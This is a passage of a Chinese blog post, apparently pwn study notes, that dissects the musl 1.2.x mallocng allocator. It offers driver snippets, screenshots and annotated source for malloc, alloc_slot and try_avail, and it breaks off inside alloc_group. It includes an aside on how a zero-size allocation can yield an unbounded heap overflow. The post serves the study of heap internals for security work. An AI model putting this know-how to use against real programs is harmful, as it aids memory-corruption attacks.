<p>我们接着申请两个Chunk，在第二次断点处，其<code>avail_mask</code>应该为0，而<code>freed_mask</code>不变</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203171438716.png"></p>
<p>这时候再申请一个chunk，即可申请出group中从上往下数首个被free的chunk，这时<code>freed_mask</code>被清空，<code>avail_mask</code>依据<code>freed_mask</code>进行重置</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203171442484.png" alt="image-20220317144243283"></p>
<p>其实总而言之就是当耗尽group中的avail_mask对应的可用chunk之后，再申请就会检测该group中是否存在被free的chunk，存在就会对被free的chunk进行处理，归到avail中，相应的avail_mask和freed_mask发生变化。</p>
<p>而如果我们改变释放顺序，依然申请出首个可用chunk，和释放顺序无关</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">	add_malloc(<span class="number">0x2c</span>)</span><br><span class="line">	edit(i,<span class="number">0x10</span>,p8(i)*<span class="number">0x10</span>)</span><br><span class="line">	</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">7</span>):</span><br><span class="line">	free(i)</span><br><span class="line">dbg()</span><br><span class="line">add_malloc(<span class="number">0x2c</span>)</span><br><span class="line">add_malloc(<span class="number">0x2c</span>)</span><br><span class="line">pause()</span><br><span class="line">add_malloc(<span class="number">0x2c</span>)</span><br><span class="line">edit(<span class="number">10</span>,<span class="number">0x10</span>,p8(<span class="number">0x11</span>)*<span class="number">0x10</span>)</span><br><span class="line">pause()</span><br></pre></td></tr></table></div></figure>

<p>如下效果</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203171447956.png" alt="image-20220317144709749"></p>
<ul>
<li>当申请到该group中无可用chunk时，尝试从该size的meta队列中的其他meta对应的group来申请chunk。</li>
</ul>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">11</span>):</span><br><span class="line">	add_malloc(<span class="number">0x2c</span>)</span><br><span class="line">	edit(i,<span class="number">0x10</span>,p8(i)*<span class="number">0x10</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">11</span>):</span><br><span class="line">	add_malloc(<span class="number">0x2c</span>)</span><br><span class="line">	edit(i+<span class="number">11</span>,<span class="number">0x10</span>,p8(i+<span class="number">11</span>)*<span class="number">0x10</span>)</span><br><span class="line">dbg()</span><br></pre></td></tr></table></div></figure>

<p>如下图所示，我们在申请出另外一个meta-group(meta1)之后，free掉第一个meta-group(meta0)中的Chunk，然后当我们消耗完meta1中的空间之后，再申请chunk的话会检测该size的meta队列，试图从中申请chunk出来，如下图即从meta0中申请出我们刚刚释放的Chunk。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203171531940.png" alt="image-20220317153130762"></p>
<ul>
<li>当该size的meta队列中无avail的chunk无free的chunk时，就会再分配一个<code>meta-group</code>来进行再分配</li>
</ul>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">11</span>):</span><br><span class="line">	add_malloc(<span class="number">0x2c</span>)</span><br><span class="line">	edit(i,<span class="number">0x10</span>,p8(i)*<span class="number">0x10</span>)</span><br><span class="line">dbg()</span><br></pre></td></tr></table></div></figure>

<p>原来的group已经不可用了，所以新分配了一个group</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203171449585.png" alt="image-20220317144959413"></p>

        <h2 id="3-关键函数-1"   >
          <a href="#3-关键函数-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-关键函数-1" class="headerlink" title="3.关键函数"></a>3.关键函数</h2>
      
        <h3 id="1-malloc"   >
          <a href="#1-malloc" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-malloc" class="headerlink" title="(1)malloc"></a>(1)malloc</h3>
      <p>参考：</p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/246929#h2-3" >musl-1.2.x堆部分源码分析 - 安全客，安全资讯平台 (anquanke.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/253566#h3-4" >从musl libc 1.1.24到1.2.2 学习pwn姿势 - 安全客，安全资讯平台 (anquanke.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v1.2.1  /src/malloc/mallocng/malloc.c</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">malloc</span><span class="params">(<span class="keyword">size_t</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (size_overflows(n)) <span class="keyword">return</span> <span class="number">0</span>;<span class="comment">//是否超过申请的最大值，这个最大值不知道多少</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    static inline int size_overflows(size_t n)</span></span><br><span class="line"><span class="comment">    &#123;</span></span><br><span class="line"><span class="comment">        if (n &gt;= SIZE_MAX/2 - 4096) &#123;</span></span><br><span class="line"><span class="comment">            errno = ENOMEM;</span></span><br><span class="line"><span class="comment">            return 1;</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">        return 0;</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">g</span>;</span></span><br><span class="line">	<span class="keyword">uint32_t</span> mask, first;</span><br><span class="line">	<span class="keyword">int</span> sc;</span><br><span class="line">	<span class="keyword">int</span> idx;</span><br><span class="line">	<span class="keyword">int</span> ctr;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//mmap分配  #define MMAP_THRESHOLD 131052(0x1FFEC)</span></span><br><span class="line">	<span class="keyword">if</span> (n &gt;= MMAP_THRESHOLD) &#123;</span><br><span class="line">		<span class="keyword">size_t</span> needed = n + IB + UNIT;</span><br><span class="line">		<span class="keyword">void</span> *p = mmap(<span class="number">0</span>, needed, PROT_READ|PROT_WRITE,</span><br><span class="line">			MAP_PRIVATE|MAP_ANON, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">		<span class="keyword">if</span> (p==MAP_FAILED) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">		wrlock();</span><br><span class="line">		step_seq();</span><br><span class="line">		g = alloc_meta();</span><br><span class="line">		<span class="keyword">if</span> (!g) &#123;</span><br><span class="line">			unlock();</span><br><span class="line">			munmap(p, needed);</span><br><span class="line">			<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">		&#125;</span><br><span class="line">        <span class="comment">//记录分配信息</span></span><br><span class="line">		g-&gt;mem = p;</span><br><span class="line">		g-&gt;mem-&gt;meta = g;</span><br><span class="line">		g-&gt;last_idx = <span class="number">0</span>;</span><br><span class="line">		g-&gt;freeable = <span class="number">1</span>;</span><br><span class="line">		g-&gt;sizeclass = <span class="number">63</span>;<span class="comment">//meta的sizeclass为63代表mmap分配</span></span><br><span class="line">		g-&gt;maplen = (needed+<span class="number">4095</span>)/<span class="number">4096</span>;</span><br><span class="line">		g-&gt;avail_mask = g-&gt;freed_mask = <span class="number">0</span>;</span><br><span class="line">		<span class="comment">// use a global counter to cycle offset in</span></span><br><span class="line">		<span class="comment">// individually-mmapped allocations.</span></span><br><span class="line">        <span class="comment">//记录分配个数</span></span><br><span class="line">		ctx.mmap_counter++;</span><br><span class="line">		idx = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">goto</span> success;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//寻找size对应的meta，ctx.active[sc]</span></span><br><span class="line">	sc = size_to_class(n);</span><br><span class="line">	rdlock();</span><br><span class="line">	g = ctx.active[sc];</span><br><span class="line"></span><br><span class="line">	<span class="comment">// use coarse size classes initially when there are not yet</span></span><br><span class="line">	<span class="comment">// any groups of desired size. this allows counts of 2 or 3</span></span><br><span class="line">	<span class="comment">// to be allocated at first rather than having to start with</span></span><br><span class="line">	<span class="comment">// 7 or 5, the min counts for even size classes.</span></span><br><span class="line">    <span class="comment">//对应size的meta为空且4=&lt;sc&lt;=32且不等于6且为偶数并且该sc没有正在使用的chunk</span></span><br><span class="line">    <span class="comment">//那么申请的chunk就会从sc+1开始申请，比如申请0x8c，对应的sc应该是8，但是由于</span></span><br><span class="line">    <span class="comment">//满足这个条件，sc为8的meta没有正在使用的chunk，对应就会从sc+1=9处开始申请</span></span><br><span class="line">	<span class="keyword">if</span> (!g &amp;&amp; sc&gt;=<span class="number">4</span> &amp;&amp; sc&lt;<span class="number">32</span> &amp;&amp; sc!=<span class="number">6</span> &amp;&amp; !(sc&amp;<span class="number">1</span>) &amp;&amp; !ctx.usage_by_class[sc]) &#123;</span><br><span class="line">		<span class="keyword">size_t</span> usage = ctx.usage_by_class[sc|<span class="number">1</span>];</span><br><span class="line">		<span class="comment">// if a new group may be allocated, count it toward</span></span><br><span class="line">		<span class="comment">// usage in deciding if we can use coarse class.</span></span><br><span class="line">		<span class="keyword">if</span> (!ctx.active[sc|<span class="number">1</span>] || (!ctx.active[sc|<span class="number">1</span>]-&gt;avail_mask</span><br><span class="line">		    &amp;&amp; !ctx.active[sc|<span class="number">1</span>]-&gt;freed_mask))</span><br><span class="line">			usage += <span class="number">3</span>;</span><br><span class="line">		<span class="keyword">if</span> (usage &lt;= <span class="number">12</span>)</span><br><span class="line">			sc |= <span class="number">1</span>;</span><br><span class="line">		g = ctx.active[sc];</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//取到avail_mask最低位的1，置零之后计算idx</span></span><br><span class="line">    <span class="comment">//根据idx从group中寻找可用chunk</span></span><br><span class="line">	<span class="keyword">for</span> (;;) &#123;</span><br><span class="line">        <span class="comment">//meta中的可用内存的bitmap, 如果g为0那么就设为0, 表示没有可用chunk</span></span><br><span class="line">		mask = g ? g-&gt;avail_mask : <span class="number">0</span>;</span><br><span class="line">        <span class="comment">//找到avail_mask的bit中第一个为1的bit</span></span><br><span class="line">		first = mask&amp;-mask;</span><br><span class="line">        <span class="comment">//如果没找到就停止</span></span><br><span class="line">		<span class="keyword">if</span> (!first) <span class="keyword">break</span>;</span><br><span class="line">        <span class="comment">//设置avail_mask中first对应的bit为0</span></span><br><span class="line">        <span class="comment">//下面是锁机制，不太懂</span></span><br><span class="line">		<span class="keyword">if</span> (RDLOCK_IS_EXCLUSIVE || !MT)</span><br><span class="line">			g-&gt;avail_mask = mask-first;</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span> (a_cas(&amp;g-&gt;avail_mask, mask, mask-first)!=mask)</span><br><span class="line">			<span class="keyword">continue</span>;</span><br><span class="line">        <span class="comment">//找到之后设置avail_mask之后转为idx, 结束</span></span><br><span class="line">		idx = a_ctz_32(first);</span><br><span class="line">		<span class="keyword">goto</span> success;</span><br><span class="line">	&#125;</span><br><span class="line">	upgradelock();</span><br><span class="line"></span><br><span class="line">	idx = alloc_slot(sc, n);</span><br><span class="line">	<span class="keyword">if</span> (idx &lt; <span class="number">0</span>) &#123;</span><br><span class="line">		unlock();</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">    <span class="comment">//找到对应meta</span></span><br><span class="line">	g = ctx.active[sc];</span><br><span class="line"></span><br><span class="line">success:</span><br><span class="line">	ctr = ctx.mmap_counter;</span><br><span class="line">	unlock();</span><br><span class="line">    <span class="comment">//从g中分配第idx个chunk, 大小为n</span></span><br><span class="line">	<span class="keyword">return</span> enframe(g, idx, n, ctr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<ul>
<li><p>判断有无超过mmap的阈值, 如果超过就mmap分配</p>
</li>
<li><p>如果没有超过, size转sc之后, 通过ctx.active[sc]找到对应的meta队列, 尝试从队列中首个meta里分配chunk</p>
</li>
<li><p>如果这个队列为空, 或者这个meta的avail_mask里面没有合适的chunk, 那就调用alloc_slot()获取chunk</p>
</li>
<li><p>找到group与idx之后通过enframe()分配出这个chunk</p>
</li>
</ul>

        <h4 id="🔺注："   >
          <a href="#🔺注：" class="heading-link"><i class="fas fa-link"></i></a><a href="#🔺注：" class="headerlink" title="🔺注："></a>🔺注：</h4>
      <p>需要注意的是，并没有对size为0进行限制，所以我们也可以申请size为0的Chunk，万一如下代码所示</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">size = readint(<span class="string">&quot;size?&quot;</span>, a2);</span><br><span class="line">*(_QWORD *)v5 = <span class="built_in">malloc</span>(size);</span><br><span class="line">v5[<span class="number">2</span>] = size - <span class="number">1</span>;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Contnet?&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> readn(*(_QWORD *)v5, v5[<span class="number">2</span>]);</span><br></pre></td></tr></table></div></figure>

<p>那么size为0就可以无限溢出了啊</p>

        <h4 id="①alloc-slot"   >
          <a href="#①alloc-slot" class="heading-link"><i class="fas fa-link"></i></a><a href="#①alloc-slot" class="headerlink" title="①alloc_slot"></a>①alloc_slot</h4>
      <figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v1.2.1 /src/malloc/mallocng/malloc.c</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">alloc_slot</span><span class="params">(<span class="keyword">int</span> sc, <span class="keyword">size_t</span> req)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//尝试在该size的meta对应的active[sc]队列内部分配chunk</span></span><br><span class="line">	<span class="keyword">uint32_t</span> first = try_avail(&amp;ctx.active[sc]);</span><br><span class="line">	<span class="keyword">if</span> (first) <span class="keyword">return</span> a_ctz_32(first);<span class="comment">//分配成功直接返回</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//如果该size的meta对应的active[sc]队列中没有合适的avail_mask</span></span><br><span class="line">    <span class="comment">//和freed_mask对应的chunk，那么就再分配一个meta-group，插入队列中</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">g</span> =</span> alloc_group(sc, req);</span><br><span class="line">	<span class="keyword">if</span> (!g) <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">	g-&gt;avail_mask--;</span><br><span class="line">    <span class="comment">//新分配的g入队</span></span><br><span class="line">	<span class="built_in">queue</span>(&amp;ctx.active[sc], g);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<ul>
<li>首先会通过<code>try_avail()</code>在以下位置寻找可用的chunk,<ul>
<li>ctx.active[sc]的meta-group的freed_mask中</li>
<li>队列中其他meta-group的avail_mask和freed_mask中</li>
</ul>
</li>
<li>如果失败,或者这个队列本来就空, 那么就会调用<code>alloc_group()</code>直接分配一个新的meta与对应的group，然后调用queue插入ctx.avtive[sc]这个队列中</li>
</ul>

        <h4 id="②try-avail"   >
          <a href="#②try-avail" class="heading-link"><i class="fas fa-link"></i></a><a href="#②try-avail" class="headerlink" title="②try_avail"></a>②try_avail</h4>
      <figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v1.2.1 /src/malloc/mallocng/malloc.c</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">uint32_t</span> <span class="title">try_avail</span><span class="params">(struct meta **pm)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">m</span> =</span> *pm;</span><br><span class="line">    <span class="keyword">uint32_t</span> first;</span><br><span class="line">    <span class="keyword">if</span> (!m) <span class="keyword">return</span> <span class="number">0</span>;<span class="comment">//如果ctx.active[sc]==NULL, 即该队列为空，直接返回</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//ctx.active[sc]对应的meta-group的avail_mask中无可用chunk</span></span><br><span class="line">    <span class="keyword">uint32_t</span> mask = m-&gt;avail_mask;</span><br><span class="line">    <span class="keyword">if</span> (!mask) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!m) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="comment">//ctx.active[sc]对应的meta-group的freed_mask中也没有chunk时</span></span><br><span class="line">        <span class="comment">//代表都在使用中，从队列中弹出该meta-group</span></span><br><span class="line">        <span class="keyword">if</span> (!m-&gt;freed_mask) &#123;</span><br><span class="line">            dequeue(pm, m);</span><br><span class="line">            m = *pm;</span><br><span class="line">            <span class="keyword">if</span> (!m) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">//获取队列中下一个meta-group</span></span><br><span class="line">            m = m-&gt;next;</span><br><span class="line">            *pm = m;</span><br><span class="line">        &#125;</span><br><span class="line">		</span><br><span class="line">        <span class="comment">//如果这个meta-group中所有的chunk都被释放了, 那么就再下一个meta-group</span></span><br><span class="line">        <span class="comment">//即不从下一个全free或者没有申请chunk的meta-group中申请chunk</span></span><br><span class="line">        mask = m-&gt;freed_mask;</span><br><span class="line">        <span class="comment">// skip fully-free group unless it&#x27;s the only one</span></span><br><span class="line">        <span class="comment">// or it&#x27;s a permanently non-freeable group</span></span><br><span class="line">        <span class="keyword">if</span> (mask == (<span class="number">2u</span>&lt;&lt;m-&gt;last_idx)<span class="number">-1</span> &amp;&amp; m-&gt;freeable) &#123;</span><br><span class="line">            m = m-&gt;next;</span><br><span class="line">            *pm = m;</span><br><span class="line">            mask = m-&gt;freed_mask;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//没太看懂想干啥</span></span><br><span class="line">        <span class="comment">// activate more slots in a not-fully-active group</span></span><br><span class="line">        <span class="comment">// if needed, but only as a last resort. prefer using</span></span><br><span class="line">        <span class="comment">// any other group with free slots. this avoids</span></span><br><span class="line">        <span class="comment">// touching &amp; dirtying as-yet-unused pages.</span></span><br><span class="line">        <span class="keyword">if</span> (!(mask &amp; ((<span class="number">2u</span>&lt;&lt;m-&gt;mem-&gt;active_idx)<span class="number">-1</span>))) &#123;</span><br><span class="line">            <span class="keyword">if</span> (m-&gt;next != m) &#123;</span><br><span class="line">                m = m-&gt;next;</span><br><span class="line">                *pm = m;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">int</span> cnt = m-&gt;mem-&gt;active_idx + <span class="number">2</span>;</span><br><span class="line">                <span class="keyword">int</span> size = size_classes[m-&gt;sizeclass]*UNIT;</span><br><span class="line">                <span class="keyword">int</span> span = UNIT + size*cnt;</span><br><span class="line">                <span class="comment">// activate up to next 4k boundary</span></span><br><span class="line">                <span class="keyword">while</span> ((span^(span+size<span class="number">-1</span>)) &lt; <span class="number">4096</span>) &#123;</span><br><span class="line">                    cnt++;</span><br><span class="line">                    span += size;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (cnt &gt; m-&gt;last_idx+<span class="number">1</span>)</span><br><span class="line">                    cnt = m-&gt;last_idx+<span class="number">1</span>;</span><br><span class="line">                m-&gt;mem-&gt;active_idx = cnt<span class="number">-1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//重新设置这个meta-group，freed_mask和avail_mask的设置</span></span><br><span class="line">        mask = activate_group(m);</span><br><span class="line">        <span class="comment">/*其实也就是设置设置一下freed_mask和avail_mask</span></span><br><span class="line"><span class="comment">        static inline uint32_t activate_group(struct meta *m)</span></span><br><span class="line"><span class="comment">        &#123;</span></span><br><span class="line"><span class="comment">            assert(!m-&gt;avail_mask);</span></span><br><span class="line"><span class="comment">            uint32_t mask, act = (2u&lt;&lt;m-&gt;mem-&gt;active_idx)-1;</span></span><br><span class="line"><span class="comment">            do mask = m-&gt;freed_mask;</span></span><br><span class="line"><span class="comment">            while (a_cas(&amp;m-&gt;freed_mask, mask, mask&amp;~act)!=mask);</span></span><br><span class="line"><span class="comment">            return m-&gt;avail_mask = mask &amp; act;</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        assert(mask);</span><br><span class="line">        decay_bounces(m-&gt;sizeclass);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//取出</span></span><br><span class="line">    first = mask&amp;-mask;</span><br><span class="line">    m-&gt;avail_mask = mask-first;</span><br><span class="line">    <span class="keyword">return</span> first;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<ul>
<li>查看这个meta-group中freed_mask中有无chunk，如果freed_mask为0, 说明这个meta-group中没有释放的chunk，就从队列中取出</li>
<li>如果有的话就会通过<code>active_group()</code>把freed_mask中的chunk转移到avail_mask中</li>
</ul>

        <h4 id="③alloc-group"   >
          <a href="#③alloc-group" class="heading-link"><i class="fas fa-link"></i></a><a href="#③alloc-group" class="headerlink" title="③alloc_group"></a>③alloc_group</h4>
      <figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v1.2.1 /src/malloc/mallocng/malloc.c</span></span><br><span class="line"><span class="comment">//用来分配一个新的group</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> struct meta *<span class="title">alloc_group</span><span class="params">(<span 